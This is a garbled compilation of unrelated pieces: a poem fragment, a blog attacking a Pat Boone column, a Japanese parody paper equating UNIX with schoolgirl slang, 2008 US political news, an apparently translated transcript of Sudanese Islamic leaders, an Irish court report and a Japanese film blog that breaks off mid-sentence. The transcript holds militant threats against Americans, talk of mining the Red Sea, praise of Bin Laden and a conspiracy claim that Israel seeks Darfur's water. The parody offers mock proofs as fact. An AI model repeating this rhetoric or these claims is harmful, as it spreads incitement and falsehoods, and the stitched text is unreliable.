Of Fleming , Jew , Walloon , a courtly allegiance
Moves to the dulcimer , gavotte and bow ,
Over the banana tree the moon in autumn —
Allegiance to a state impossible to tell .

So sayeth Pat Boone , the pop singer turned Christian crooner turned crazy old terrified man who'll apparently spout any old shit as his time on this earth dwindles .
From Boone 's " exclusive commentary " on wingnut central WorldNetDaily :
Thank God , it could n't happen here .
Could it ?
Look around .
Watch your evening news .
Read your newspaper .
Are you unaware of the raging demonstrations in our streets , in front of our churches and synagogues , even spilling into these places of worship , and many of these riots turning defamatory and violent ?
Have you not seen the angry distorted faces of the rioters , seen their derogatory and threatening placards and signs , heard their vows to overturn the democratically expressed views of voters , no matter what it costs , no matter what was expressed at the polls ?
Twice ?
Assuming you have become aware of all this , let me ask you :
Have you not seen the awful similarity between what happened in Mumbai and what 's happening right now in our cities ?
Oh , I know the homosexual " rights " demonstrations have n't reached the same level of violence , but I 'm referring to the anger , the vehemence , the total disregard for law and order and the supposed rights of their fellow citizens .
I 'm referring to the intolerance , the hate seething in the words , faces and actions of those who did n't get their way in a democratic election , and who proclaim loudly that they will get their way , no matter what the electorate wants !
What troubles me so deeply , and should trouble all thinking Americans , is that there is a real , unbroken line between the jihadist savagery in Mumbai and the hedonistic , irresponsible , blindly selfish goals and tactics of our homegrown sexual jihadists .
Hate is hate , no matter where it erupts .
And by its very nature , if it 's not held in check , it will escalate into acts vile , violent and destructive .
女子高生のカーネル領域における言語的等価性
新山 祐介
概要
この論文では UNIX と女子高生の数学的同値性を証明する。 高度に発達した離散的コミュニティでは、 そこで使用される言語=表象はおよそ一般的な話し言葉とは著しく異なったものに対応させられる。 本論文ではまず UNIX コミュニティにおける言語と女子高生コミュニティにおける言語の相似性を提示する。 つぎにこのような言語体系をうみだす環境の認知心理学的類似性について考察し、
UNIX が女子高生と数学的に等価であることを示す。また両者の今後の展開についても予測をおこなう。
相対的に分裂する主 体
高度に発達したネットワークをもつコミュニティでは、各所属メンバーは自分の所属を意識せずにシステムに従属する。このような領域においては、ラトゥールが指摘したような特権化された「計算の中心」は存在せず、すべての主体は相対的な次元で表されるベクトルでしかありえない
[ Latour , 1999 ] 。にもかかわらず、システムは自発的に現れる「専門言語」という制約を各個体に対して課すことによって、システム全体に創発的な専制的表象
-- 各個体の挙動および外部からの干渉によってカオス的に出現してくる一種のメタ具現化であるような2階の従属的可換テンソル -- を生みだす [ Delauz , 1987 ] 。本論文ではこれらのメカニズムを提供するひとつの理論を提示する。
ここで我々は、現代的な意味での領域を代表する主体として「女子高生」をとりあげることにしよう。このコミュニティはきわめて興味深い性質を備えている。各個体はネットワークによって互いに密に接続されており、頻繁な情報交換がなされる。またマスメディアによる大量洗脳が日々行われており、このような状況では自発的に現れたシステムは継続的な外的抑圧にさらされることになる。しかしながら女子高生コミュニティはこの状況を環境と自己表現の集合的積算によって生じたホメオスタシス的自律エージェントとなることによって「種の非線型平衡状態」を保つことに成功している
[ Virilio , 1993 ]
。我々は彼女らの言語現象に着目したい。これらの専門言語はそのコミュニティを安定化させ、カオス的外圧からシステムを保護し強化するものであることを見ていく。とくに我々は、彼女らの存在が、同じくネットワーク上において発達し強化されてきた
UNIX 言語と数学的に等価であることを示し、両者が存在論的に同一であること、とりわけ計算機システムによって人間のネットワークがまったく代替可能であることを証明する。
UNIX 言語との数理学的共通点 -- 最適化と並列化
まず最初の例として、我々は非常に初歩的な女子高生テクスト「チョベリバ！」を考える。これはいくつかの形態素のハイパーベクトル空間における準拠的
( レフェランス ) 混合物であり、従来の男性優位の科学では表現できなかった概念であることは疑うべくもない。このテクストは次のような拡張チョムスキー型一般句構造文法によって置換
= 表現が可能である :
<概念> → < 主観限量子 > < 概念> | < 主観演算子 > < 主観演算子 > → f translingua ( < 主観限量子 > ) < 主観演算子 > → f abbreviation ( < 主観限量子 > ) < 主観演算子 > → f exaggeration ( < 主観限量子 > ) < 主観演算子 > → < 一般限量子 > | < 一般評価識別子 > < 一般限量子 > → “ 非常に ” < 一般評価識別子 > → “ 悪 い ”
ここでは 2つの拡張型( 非写像的 ) 関数が使われる。トランス言語演算子 ( translingua ) は、ある言説を別の言語族に対応させる操作を指す。これによって本質的に日本語の超越演算子「超」から英語の ``very '' が、一般評価 識別子 「 悪い 」 から英語の ``bad '' が生成される。また省略置換演算子 ( abbreviation ) は音節数をひとつ削減させる。この例では ``bad '' は 「 バ 」に、「超 」 は「チョ」に変換せらるのである。超越演算子 ( exaggeration ) は、事態を必要以上に強調させてみせるという生物学的必然性を具現化する。以上のような言語システムから当初のテクスト「チョベリバ！」に対し多段階導出解析をほどこしてみると、以下のようになる:
<概念>
( 規則 1・生成 ) → < 主観限量子 > <概念>
( 規則 1・生成 ) → < 主観限量子 > < 主観限量子 > <概念>
( 規則 1・生成 ) → < 主観限量子 > < 主観限量子 > < 主観限量子 >
( 規則 2・生成 ) → < 主観限量子 > f translingua ( < 主観限量子 > ) f translingua ( < 主観限量子 > )
( < 主観限量子 > ) ( < 主観限量子 > ) ( 規則 4・生成 ) → f exaggeration ( < 主観限量子 > ) f translingua ( < 主観限量子 > ) f translingua ( < 主観限量子 > )
( < 主観限量子 > ) ( < 主観限量子 > ) ( < 主観限量子 > ) ( 規則 3・生成 ) → f abbreviation ( f exaggeration ( < 主観限量子 > ) ) f abbreviation ( f translingua ( < 主観限量子 > ) ) f abbreviation ( f translingua ( < 主観限量子 > ) )
( ( < 主観限量子 > ) ) ( ( < 主観限量子 > ) ) ( ( < 主観限量子 > ) ) ( 規則 5 ・生成 ) → f abbreviation ( f exaggeration ( < 一般限量子 > ) ) f abbreviation ( f translingua ( < 一般限量子 > ) ) f abbreviation ( f translingua ( < 一般評価識別子 > ) )
( ( < 一般限量子 > ) ) ( ( < 一般限量子 > ) ) ( ( < 一般評価識別子 > ) ) ( 規則 6・生成 ) → f abbreviation ( f exaggeration ( “ 非常に ” ) ) f abbreviation ( f translingua ( “ 非常に ” ) ) f abbreviation ( f translingua ( < 一般評価識別子 > ) )
( ( “ 非常 に ” ) ) ( ( “ 非常 に ” ) ) ( ( < 一般評価識別子 > ) ) ( 規則 7・生成 ) → f abbreviation ( f exaggeration ( “ 非常に ” ) ) f abbreviation ( f translingua ( “ 非常に ” ) ) f abbreviation ( f translingua ( “ 悪 い ” ) )
( ( “ 非常 に ” ) ) ( ( “ 非常 に ” ) ) ( ( “ 悪 い ” ) ) ( 還元・超越演算子 ) → f abbreviation ( “ 超 ” ) f abbreviation ( f translingua ( “ 非常に ” ) ) f abbreviation ( f translingua ( “ 悪 い ” ) )
( “ 超 ” ) ( ( “ 非常 に ” ) ) ( ( “ 悪 い ” ) ) ( 還元・トランス言語演算子 ) → f abbreviation ( “ 超 ” ) f abbreviation ( “ very ” ) f abbreviation ( “ bad ” )
( “ 超 ” ) ( “ very ” ) ( “ bad ” ) ( 還元・省略置換演算子 ) → “ チ ョ ” “ ベ リ ” “ バ ！ ”
→ “ チョベリバ ！ ”
ところで、読者は驚かれるかもしれないが、以上のような言語体系はまさに
UNIX 言語におけるコンパイラ言語、つまりピア・ツー・ピアにおける
JAVA トポロジーの構造とまったく同一なのだ。それのみならず、これらの法則は
UNIX 世界における普遍的な文法構造をも包括するのである。以下の例でまったく同じ文法構造を用いて、UNIX 世界でしかおよそ通用しえないジャーゴンであるところの「 xmkmf ( おそらくこの文字列の発音方法さえも我々の常識からは著しくかけ離れているため、ここには文化人類学的特徴がみられる。これは後ほど考察する)」が生成されるのを見てほしい:
<概念> → < 一般オブジェクト記述子 > < 概念> | < 一般オブジェクト記述子 > < 一般オブジェクト記述子 > → f translingua ( < 一般オブジェクト記述子 > ) < 一般オブジェクト記述子 > → f abbreviation ( < 一般オブジェクト記述子 > ) < 一般オブジェクト記述子 > → f exaggeration ( < 一般オブジェクト記述子 > ) < 一般オブジェクト記述子 > → < 動作述語識別子 > | < クラスオブジェクト識別子 > < 動作述語識別子 > → “ 生成す る ” < クラスオブジェクト識別子 > → “ 依存関係ファイル ” | “ へっぽこウインドウシステ ム ”
この規則は上に適用した規則とほとんど同じものであることに注意。ここから我々は
UNIX において重要なコマンドのひとつであ る“ xmkmf ” の導出を確認している :
<概念>
( 規則 1・生成 ) → < 一般オブジェクト記述子 > <概念>
( 規則 1・生成 ) → < 一般オブジェクト記述子 > < 一般オブジェクト記述子 > <概念>
( 規則 1・生成 ) → < 一般オブジェクト記述子 > < 一般オブジェクト記述子 > < 一般オブジェクト記述子 >
( 規則 4・生成 ) → f exaggeration ( < 一般オブジェクト記述子 > ) f exaggeration ( < 一般オブジェクト記述子 > ) < 一般オブジェクト記述子 >
(< 一般オブジェクト記述子 > ) (< 一般オブジェクト記述子 > ) < 一般オブジェクト記述子 > ( 規則 2・生成 ) → f translingua ( f exaggeration ( < 一般オブジェクト記述子 > ) ) f translingua ( f exaggeration ( < 一般オブジェクト記述子 > ) ) f translingua (< 一般オブジェクト記述子 > )
( (< 一般オブジェクト記述子 > ) ) ( (< 一般オブジェクト記述子 > ) ) ( < 一般オブジェクト記述子 > ) ( 規則 3・生成 ) → f abbreviation ( f translingua ( f exaggeration ( < 一般オブジェクト記述子 > ) ) ) f abbreviation ( f translingua ( f exaggeration ( < 一般オブジェクト記述子 > ) ) ) f abbreviation ( f translingua ( < 一般オブジェクト記述子 > ) )
( ( ( < 一般オブジェクト記述子 > ) ) ) ( ( ( < 一般オブジェクト記述子 > ) ) ) ( ( < 一般オブジェクト記述子 > ) ) ( 規則 5 ・生成 ) → f abbreviation ( f translingua ( f exaggeration ( < クラスオブジェクト記述子 > ) ) ) f abbreviation ( f translingua ( f exaggeration ( < 動作述語識別子 > ) ) ) f abbreviation ( f translingua ( < クラスオブジェクト記述子 > ) )
( ( ( < クラスオブジェクト記述子 > ) ) ) ( ( ( < 動作述語識別子 > ) ) ) ( ( < クラスオブジェクト記述子 > ) ) ( 規則 6・生成 ) → f abbreviation ( f translingua ( f exaggeration ( < クラスオブジェクト記述子 > ) ) ) f abbreviation ( f translingua ( f exaggeration ( < “ 生成する ” > ) ) ) f abbreviation ( f translingua ( < クラスオブジェクト記述子 > ) )
( ( ( < クラスオブジェクト記述子 > ) ) ) ( ( ( < “ 生成する ” > ) ) ) ( ( < クラスオブジェクト記述子 > ) ) ( 規則 7・生成 ) → f abbreviation ( f translingua ( f exaggeration ( “ へっぽこウインドウシステ ム ” ) ) ) f abbreviation ( f translingua ( f exaggeration ( “ 生成す る ” ) ) ) f abbreviation ( f translingua ( “ 依存関係ファイ ル ” ) )
( ( ( “ へっぽこウインドウシステ ム ” ) ) ) ( ( ( “ 生成す る ” ) ) ) ( ( “ 依存関係ファイル ” ) ) ( 還元・超越演算子 ) → f abbreviation ( f translingua ( “ Ｘウインドウシステム ” ) ) f abbreviation ( f translingua ( “ 作る ” ) ) f abbreviation ( f translingua ( “ 依存関係ファイ ル ” ) )
( ( “ Ｘウインドウシステ ム ” ) ) ( ( “ 作 る ” ) ) ( ( “ 依存関係ファイル ” ) ) ( 還元・超越演算子 ) → f abbreviation ( f translingua ( “ Ｘウインドウシステム ” ) ) f abbreviation ( f translingua ( “ 作る ” ) ) f abbreviation ( f translingua ( “ 依存関係ファイ ル ” ) )
( ( “ Ｘウインドウシステ ム ” ) ) ( ( “ 作 る ” ) ) ( ( “ 依存関係ファイル ” ) ) ( 還元・トランス言語演算子 ) → f abbreviation ( “ X Window System ” ) f abbreviation ( “ make ” ) f abbreviation ( “ Makefile ” )
( “ X Window System ” ) ( “ make ” ) ( “ Makefile ” ) ( 還元・省略置換演算子 ) → “ x ” “ mk ” “ mf ”
→ “ xmkmf ”
以上の適用は、まったく異なる領域から発生した
2つの相異なるコミュニティ -- 女子高生および UNIX ( ギーク的世界 ) -- が、外的な抑圧から自らのシステムを保護するため創発的に言語体系を変成させた例としてみることができよう。両者がこのような戦略をとったのは偶然ではない。すなわち、双方とも言語を必要以上に誇張し変換し短縮化した。これはシステム上において一種のスレッドセーフな暗号化ゲートウェイを構築することに相当する。つまり各主体は相互に暗号／復号化をくりかえす自律的分散型エージェントとみなすことができるのである。我々は以上で挙げた例以外にも「チョー
MM ( 非常に + まじめに + ムカつく) 」などが同様の規則によって適応しうることを見いだしている [ 新山 , 2000 ] 。ちなみにこの場合の UNIX における対応物は 、UNIX の派生物である LINUX カーネルにおけるメモリ・マネージメント・モデル ( MM ) となることを付け加えておく。
ここで我々はひとつの倫理的問題が生じたことによって頭を悩ませねばならない。なるほど、たしかに科学は人類の歴史を
( in a sense - ある意味で ) 改善してきたといえるだろう。しかしこのように、人間の内在的認知機構と機械
( これは厳密にチューリング的な意味での「machinary 」を意味する ) を同一のモデルで扱ってしまってよいものであろうか?
しかし我々はこの問いには今のところ答えずにすませたい。いずれにせよ、ここに示したトポロジー的構造 -- それが社会の変革に帰するところのものであるかどうかは神のみぞ知ると言いたいところではあるが -- は、何であれその内在的変成意識を表象するひとつの構造なのである。
もうひとつの共有コンテキストは、そのパラ並列性をしめす言説である。たとえば、次の文を見てみよう:
“ …それで、そのあとアッくんと帰ってさー、そう、明日テストなんだけどー、でも、いま香織ちゃんそっちから出てったよー?、で、お母さんが茄子は身体に悪いって、… ”
ここでの各文はプロセスを表す。この文脈の無視された例文では、各主題は中途まで提示されたまま、その完結を待たずに次の談話へと移行する(文脈はナル・ポインタにより閉じられている)。これが半ば閉じられたもの、すなわちトポロジーの包括的複号化におけるホモロジー代数の可換環と同一化
( 本来は unification -- 単一化と呼ばれているが、ここでは我々の概念により一致するこちらの訳語を採ることにする ) できることは周知の事実である。この文章は各プロセスの終了を待たずに次の談話が生成されている -- つまり前進的かつ並列的なスレッド化された発話 ( threadized utterance ) がみられるのである。これは何を意味するのであろうか?
この答えは、これとよく似た UNIX 言語でのテクスト表現を見るとき明白になる :
find .
- name '*.[ ch ] ' | awk - F/ '{ print $ 2} ' | sort -r | uniq -c
上の例におけるバー表記 「 | 」はプロセスの 「パイプライン化」を示している。これは上の女子高生言語における読点「、」に相当するメタ意味論的記述をもつ。各プロセスは同時に実行され、互いの終了を待たずに結果は貫通する。両者の完了しない発話を状態遷移図を用いて解説することは、本論文の範囲を超える技術的問題を含んでいるため割愛するが、彼女らが日常的にこのような完了しない「宙に浮いた」世界を体感していることは容易に想像できよう。これはプロセスとしての暴力、相対化構築物としての可能世界に溢れており、それ自体ラカン主義的な患者である。女子高生世界と
UNIX 世界、両者の根底に は 2つの文化における民族 -- その構成体として絶対唯一のインフラストラクチャに依存する -- の対面相互行為にける「儀礼」と「癒し」の問題が横たわっているとみることができる。つまりここにはセクシュアリティは存在せず、オースチンが言うところの「発話することによる儀式行為
( つまり稚拙きわまりないマウスによる管理システムを『未知の(X)ウインドウシステム』と呼ぶことなど)」が厳としてそのネットワークコミュニティへの入口であり同時にかつ反射鏡であるようなパケットフィルタリング的ファイヤーウォールとなっているのである
[ Austin , 1978 ] 。ここでは各主体の成長、コミュニティにおける成熟性はその大脳生理学的成長よりも「形態的多弁さ ( morphological verbosity ) 」によって判定され、より高度な言語生成規則を司るものが個体としての繁栄を得るとされる。しかしこの人類学的考察に関して我々はまだ確固とした証拠を得ていない。
以上の例からみるように 、UNIX および女子高生には数理言語学的に共通する部分が数多くあり、結局のところこれらは同一である。ゲーデルを待つまでもなく、言語の構造における限界は人間の思考過程の無矛盾性を体現している。我々にできることはただ、このような社会構造が我々に及ぼしうる変化と退行への恐怖が杞憂であることを祈るだけである。
今後の予 測
一般的にいって未来を予測することは危険であるが、本節ではあえてそれを試みることにする。現在のところ、女子高生の総体的エントロピーが最も高い領域は東京の渋谷であるが、これは近年ビットバレーとして知られており、これは
UNIX の存在確率がもっとも ( これは文字通りボルツマン的な過程を意味する )
高い領域である米国シリコンバレーと呼応する。とすると、反-UNIX 陣営の牙城であるワシントン州レッドモンドには巨大な「ビル」が存在するため、これは日本の東京における「新宿」と機能的に等価であるといえよう。すると今後の女子高生にとってのカウンターカルチャー、反-システム、すなわち非オートポイエーシスとなる抽象的実体が新宿から出現するのは必至であることは言うまでもない。
これに対抗するため、渋谷という総体そのものは何をもって対立的な構図を打ち出すだろうか。ここで我々の視界に入ってくるのは、もうひとつのビルの存在 -- つまり「池袋」である。池袋でビルといえばサンシャイン
60 であるが、サンとは高地ゲール語で「太陽」を表象し、これは
UNIX 陣営における「サン」に相当する。すると池袋におけるビルというのは、その創始者であるもう一人のビルに相違ない。
( ラリーについては我々は現在まだ調査中であり、その結果をここで云々するには未だ時期早尚であると我々は判断する。)
つまり今後の女子高生の形態的定量予測は、新宿をカウンターカルチャーとし、池袋を共立的
( コンシスタンス ) メタモルフォーゼとしたビル街における大量の窓との闘争に発展すると思われる。

Obama calls on Fox News at press conference Nick Cargo
Published : Wednesday December 3 , 2008
Print This Email This Breaking a streak of snubs , President - elect Barack Obama , at a Wednesday press conference with New Mexico Governor and Commerce Secretary designee Bill Richardson , took a question from a Fox News correspondent .
Obama , who ignored Fox News five consecutive times at previous press conferences , answered a question from the network 's Wendell Goler .
Goler asked Obama if he was fearful over the prospect of Treasury Sec. Paulson allocating all TARP bailout funds before he takes office .
" And if I may also ask the Governor : What happened to the beard , sir ? "
" I 'm going to answer this question about the beard , " Obama responded .
" I think it was a mistake for him to get rid of it .
I thought that whole Western , rugged look was really working for him .
For some reason , maybe because it was scratchy when he kissed his wife , he was forced to get rid of it -- but we 're deeply disappointed with the loss of the beard .
" With respect to TARP : Until Secretary Paulson indicates publicly that he 's drawing down the second ... half of the TARP money , it would be speculation on my part to suggest that that money 's going to be used up . "
Congress , he said , has to be notified , and can also prevent access to the funds .
" I will say that my team has been reviewing very carefully how the TARP program has proceeded .
One of my central principles when I first examined the TARP proposal was to insist that there was going to be strong oversight . "
Governor Richardson , also an early Democratic contender in the 2008 presidential election , has a long history of serving in cabinet posts .
Under President Clinton in 1997 he was appointed U.S. Ambassador to the United Nations , moving to a position as U.S. Secretary of Energy in 1998 , where he stayed for the rest of Clinton 's presidency .
The following video was broadcast on Fox News on December 3 , 2008 :
Following are excerpts from a conference held by Islamic leaders in Sudan , which aired on Al - Jazeera TV on July 3 , 2007 .
Dr. Hassan Al - ' Audha , Sudanese Muslim Brotherhood : America believes that it is the master of the world , and that all other people are its slaves , who are subordinate to it , and must obey it .
America believes that it owns the oil discovered in Sudan .
These are not my words .
[ Former U.S. President ]
Carter declared some two years ago : " We wanted the oil of Sudan to be used for the pleasure of the American people after 2005 . "
[...]
What shall we do if these accursed forces come to our country ?
Shall we give in to them , wave oil branches , and release doves for them , or should we take a stand ?
Our position is clear – America understands nothing but the power of the weapon .
It understands nothing but the power that causes the greatest number of casualties to it .
It understands nothing but the fighting against its economy .
That is why we are confident that , with Allah 's help , if these forces reach this country , we have young men , religious scholars , sheiks , intellectuals , and people who are zealous for this country .
Any person who is zealous for this country will sacrifice himself for the sake of the homeland .
I do n't mean " homeland " in the sense of the soil .
We are not zealous for this land because of the rivers that flow in it .
We are zealous for it because it is the land of Islam .
[...]
America and its helpers have not left any country without destroying it first .
This is a well - known thing .
Even in the days of the so - called " liberation of Kuwait – we are now realizing its negative effect on the environment of the Gulf , which has left medicine and doctors helpless .
Many diseases have spread – cancer and so on – because of the waste brought in containers and buried in the Gulf desert .
Today , there are entire hospitals for the treatment of cancer only .
We will not be any better off than them , unless we learn the lesson from what happened to them .
[...]
This people has a glorious history .
Gordon Pasha , who humiliated the Chinese – the Sudanese here cut off his head .
The Sudanese wiped out much of the British arrogance , to the point that the British wrote that the Sudanese people is like a sleeping dog that should not be awakened .
They provoke us and awaken us , but Allah willing , we will show them .
[...]
Muhammad Ahmad Hajj Ahmad , Commander of the Popular Defense Forces : Whoever talks about genocide and about [ ethnic ] cleansing and all that should tell us what is going on in Palestine , in Iraq , and in Afghanistan .
Throughout the history of this world , we have heard about women being raped by men .

Abd Al - Jalil Muhammad , international expert : Why Darfur ?
Darfur is situated on top of the largest fresh - water reservoir in Africa and the world .
The next war will be a war over water , and Israel cannot engage in war with the countries in which the Nile originates or flows .
To compensate for this , Israel wants to control Darfur , thus gaining control of this fresh water .

These [ foreign ] forces will back up the Hebrew forces , which will take over the Nile in order to expand their country .

Another Sudanese Islamic leader :
The resistance now has methods and tactics .
It has defeated America everywhere .
What happened in Iraq is the best example .
They should know , in case any future fighting takes place , that men from Sudan went to fight in Afghanistan .
There was a Sudanese camp in Afghanistan .
If they do n't know that – they should know .
The Afghans knew about it , and would say : " The Sudanese are number one . "
They knew that the Sudanese are ferocious fighters – number one !
People went to fight in Iraq .
The [ Americans ] know who they are .
If they come here , the people wo n't have to travel away .
If the enemy comes here , it should know what will happen to it .
They should be deceived by the hypocrites .
Khartoum is in the heart of a vast country , one million square miles in size .
The Red Sea has a coastline 1,000 km long , which the resistance can take advantage of .
Every day , 10.5 million barrels of oil must reach America .
If the resistance were to seal off the Red Sea , using primitive methods , it could fill it with sea mines – here and elsewhere ...
They are very cheap , and the mujahideen produce them themselves ...
America will not get 20.5 million barrels .
If the Bab Al - Mandab straits are closed , America will be over and done with .
They cannot exist without their life artery , which is oil .
The battle will not be just in Darfur , like the president of Sudan said .
It will be throughout Sudan. 15 % of the American oil comes from West Africa .
The mujahideen are deployed throughout Africa .
They should take it into consideration .
They will meet their death and destruction in Sudan .
They will not come to an end in Iraq .
Their annihilation will be in Sudan .
Sudan has mountains and plains .
It is the most beautiful place in which our sheik , Bin Laden , can operate .

I do n't want to go on , brothers .
We have done talking .

By Allah , we do n't care about any of this .
All we want is to die for the sake of Allah .
Just a bullet here – and you are gone .
Let them come – by Allah , we will teach them a lesson .
A hospital can give a potentially life - saving blood transfusion to a girl whose Jehovah 's Witnesses parents are objecting on religious grounds -- but only if it is absolutely necessary , a High Court judge has directed .
The Dublin hospital made an emergency application on Tuesday seeking an order allowing the transfusion after the parents refused to give consent .
The child , who is four - and - a - half , was admitted to the hospital last Sunday and needed to have fluid drained from her lung .
It was possible this draining procedure would lead to severe loss of blood and the child would need to be transfused , the hospital claimed .
But the parents , whose religion prohibits blood transfusions , objected .
Yesterday , the mother of the child appeared in court accompanied by two members of a liaison committee which works with families in situations like this .
One of the committee members , Harry Homan , said the mother wanted it to be known that she was very happy with the hospital 's treatment of her child , she was objecting on deeply - held religious grounds .
The court heard yesterday from a consultant surgeon who said that while a blood transfusion may not be necessary , it was his clinical opinion that the option must be available before the procedure went ahead .
It was felt by all doctors involved in the case that the procedure could not go ahead without the back up of having a transfusion available , he added .
Explore
Mr Homan , on behalf of the mother , asked the doctor to explore the possibility of using the hospital 's " cell - salvage machine " to collect the child 's blood and re-use it .
The doctor said if it was possible , they would do this , but in this child 's case it would not be possible to save all the red cells .
Ms Justice Mary Laffoy said she was satisfied she did have the power to make an order .
She directed the hospital to provide all necessary care for the child including , if necessary , a blood transfusion , but only where no other method is available and she requires medical intervention .
" So only if it is absolutely necessary , " she said .
Several top Democratic senators have launched a behind - the - scenes effort to save Sen. Joe Lieberman ’s chairmanship .
Dem senators try to save Lieberman
Several top Democratic senators have launched a behind - the - scenes effort to save Sen .
Joe Lieberman ’s chairmanship , despite calls from a Democratic base seeking retribution for Lieberman ’s vocal support of John McCain ’s presidential campaign .
Sens. Chris Dodd ( D - Conn. ) , Ken Salazar ( D - Colo . ) , Tom Carper ( D - Del. ) and Bill Nelson ( D - Fla. ) are all involved in the effort , according to top Senate Democratic aides .
These four senators — along with other Lieberman allies — are reaching out to the rest of the Democratic Senate caucus to try to ensure Lieberman survives a secret ballot vote on whether to strip him of his chairmanship of the Homeland Security and Governmental Affairs Committee .

This effort , along with kind words from Majority Whip Richard J. Durbin ( D - Ill . ) last night about Lieberman , is giving the Connecticut senator some serious momentum heading into next week ’s secret vote .
Dodd ’s involvement in saving his home - state senator is an extraordinary turn because Dodd backed Democratic candidate Ned Lamont in 2006 against Lieberman , who won the Connecticut Senate race as an independent .
Dodd , however , had backed Lieberman in the Democratic primary and only switched support to Lamont when he became the Democratic nominee .
Also driving the effort to save Lieberman — an outcast with the progressive left — is the spirit behind Barack Obama ’s victory .
“ He ’s got momentum , and we need to keep him in the caucus , and this fits into Barack Obama ’s message of change and moving forward , ” said one Senate Democratic aide familiar with discussions .
“ The message here is that we do n’t want to start off a new era with retribution . ”
Democratic senators are also trying to figure out a token punishment for Lieberman if he retains his chairmanship , but that has not been decided .
One of the options being discussed would be to revoke other committee assignments while letting Lieberman keep his chairmanship of Homeland Security .
Lieberman is a senior member of the Armed Services Committee , and his support for the Iraq war was what drove him into the arms of the McCain campaign early this year .
The Lieberman situation is very sensitive for Democratic leaders , and several offices declined to publicly comment on the Dodd and Salazar effort .
“ Sen .
Carper has no comment and is referring all such inquiries to Sens. Reid and Lieberman , ” said Carper spokeswoman Bette Phelan .
A spokesman for Senate Majority Leader Harry Reid ( D - Nev. ) declined to comment , as did one for Salazar .
Lieberman spokesman Marshall Wittmann said that his office was “ not commenting on the process right now . ”
On Tuesday night , Senate Majority Whip Richard J. Durbin said Senate Democrats should be " gracious in victory " toward Lieberman , according to an AP report .
" Despite what Sen. Lieberman did in campaigning for Sen. McCain , speaking at the Republican convention , he has voted with the Democrats an overwhelming percentage of the time , " he said .
During a Thursday meeting in Reid ’s office , Lieberman told Reid that if he was stripped of his chairmanship he would bolt from the Democratic caucus , and Senate Minority Leader Mitch McConnell has already reached out to Lieberman should he decide to leave the Democratic side of the aisle .
Speaking to reporters in Connecticut , Dodd made the case that President - elect Obama has “ talked about reconciliation , healing , bringing people together .
I do n't think he'd necessarily want to spend the first month of this president - elect period , this transition period , talking about a Senate seat , particularly if someone is willing to come forward and is willing to be a member of your family in the caucus in that sense . ”
Aides cautioned that there are not simply two camps — keep him or dump him — in the Senate Democratic caucus .
Instead , a number of options are being considered that would allow him to keep his chairmanship and remain in the caucus but still suffer some sort of penalty .

The Red Dawn Difference
November 9 , 2008 by lestro
by lestro
For all the talk of the youth vote being the demographic that put Obama over the top , the truth is that while their energy and legwork was unmatched , the real revolution in this election came not in the 20 - somethings , but in the 30 - somethings .
It is the Red Dawn generation , the forgotten demographic , that made the difference this time around .
We are the 30 - somethings who in the past eight years have grown into not only the dominant demographic in the media and commercial sectors , but have also started raising families and buying homes – the time when people start to seriously vote .
We are also the first generation to be raised completely under the ideals the Baby Boomer worked so hard to establish .
We are done fighting battles of the 60s and do n’t see the world the in black and white ways of our parents and we have reached the point in our lives when people become politically active .
The proof is in the exit poll results .
This was not a youth movement , but one led by the tail end of Generation X and the Red Dawn Generation , those of us who came of age in the era of Reagan and Thriller and Mutual Assured Destruction .
In 2004 , the youth vote made up 17 percent of the electorate .
In 2008 , they made up 18 percent .
In 2004 , they went to Kerry 54 - 45 .
This year they broke 66 - 32 for Obama .
The 30 - 44 demographic , however , where the real Change took place .
In 2004 and 2008 , they made up 29 percent of the vote , but in ’04 they voted for Bush 53 - 46 .
This year , they went 52 - 46 for Obama .
THAT was the group that won this election for Obama , not the youth vote .
Fifty - two percent of 29 is way bigger than 66 percent of 18 .
A new generation of leadership with a new worldview has arrived on the scene .
Fortunately , we are already well - conditioned on coping with and cleaning up the messes of our parents .
We are the latchkey generation , learning to care for ourselves as watched our parents divorce , remarry , work careers and refuse to fully admit their adulthood .
The turnout in the youth demographic certainly was impressive – as was the margin – but the real shift in this race came in the 30 - somethings .
That is the demo where the sea change has occurred .
And now it ’s time to see what we can do .
Mr. McCain has found relatively small crowds  particularly compared with those that are turning out for Mr. Obama  even as he has campaigned in battleground states .
His campaign has become embroiled by infighting , with signs of tension between Mr. McCain ’s advisers and Ms. Palin ’s staff , and subject to unusual public criticism from other Republicans for how his advisers have handled this race .
Republicans and Democrats said there were signs that two states that had once appeared overwhelmingly Republican , Georgia and South Carolina , were tightening , in part , because of surge of early - voting by African - Americans .
An Obama win in the states seemed unlikely  and no plans were immediately on his itinerary to travel to them  but it is a sign of how volatile a year this is that more states would seem to be coming into play , rather than being settled , as the election approaches .
Mr. McCain ’s aides said they remained confident that they could win .
They said their candidate did not plan to introduce any kind of formal closing speech , the way Mr. Obama is doing , but would instead hammer home the issues of taxes and spending they said appeared to be giving them some steam .
“ We feel good that when people hear the message about spreading the wealth versus raising taxes , they respond , ” said Nicolle Wallace , a senior McCain adviser .
“ It ’s just a matter of whether , given Obama ’s saturation paid advertising , we can get the message out there . ”
The contours of these final days suggest a culmination of a strategy that Mr. Obama ’s advisers put in place at the beginning : to use his huge fund - raising edge to try to put as many states in play as possible and overwhelm Mr. McCain in the final days of the race .

Some Republicans questioned the wisdom of his campaigns spending time in the state .

遅ればせながら映画『容疑者ケインズ』、もとい、映画『容疑者xの献身』を観てきた。
なぜ観に行ったか、というと、ぼくがCDまで買ってしまいそうな勢いの柴咲コウのファンだからでは決してなく、福山演じるガリレオ先生の講義のように教室を女子大生でいっぱいにするにはどうしたらいいかを学びたいから、ってえのでも全くない。実は、小学生の息子が、「どうしても観たい」、といったので連れていくことにしたのだ。息子は、テレビでの『ガリレオ』を観て、このシリーズのファンになったようだ。表向きには、理科マニアであることが理由なのだが、その実、柴咲お姉さまにやられてしまっているのかどうかは定かではない。(ママには内緒にしといてあげよう)。まあ、理科雑誌「RikaTan」(ムペンバ効果と経済 - hiroyukikojimaの日記参照)を与えて以来、繰り返し熟読しているので、まんざらウソでもないだろう。本当に、この雑誌は息子には面白いらしい。理科好きの小学生の親御さんには、是非とも推薦したい 。
「 将来、役者と物理学者になることだけは、パパは許しませんからね」
宇宙ゼータ研究 所
実際、息子は友だちには 「 理科王子」とか呼ばれているとのことで、ウケてしまった。父親としては、これまで口を酸っぱくして、といってきたつもりだが、それが逆効果になってしまったかもしれない。観に行った理由はもう一つあり、それは、先日、雑誌対談した数学者の
